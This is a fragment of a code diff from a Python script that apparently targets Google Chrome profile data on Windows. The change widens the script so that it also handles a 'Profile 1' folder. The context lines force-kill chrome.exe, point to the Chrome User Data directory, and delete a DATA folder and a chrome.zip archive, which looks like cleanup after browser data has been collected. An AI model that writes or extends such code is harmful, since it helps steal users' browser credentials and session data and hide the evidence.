@@ -139,7 +139,7 @@ if path.exists(base_path + "Default"):
             continue
     shutil.rmtree(f"{base_path}Default\\DATA")
     shutil.rmtree(environ['USERPROFILE']+"\\AppData\\Local\\Google\\Chrome\\chrome.zip")
-else:
+elif path.exists(environ['USERPROFILE']+"\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1"):
     system("taskkill /im chrome.exe -f")
     base_path = environ['USERPROFILE']+"\\AppData\\Local\\Google\\Chrome\\User Data\\"
     path_data = environ['USERPROFILE']+"\\AppData\\Local\\Google\\Chrome"
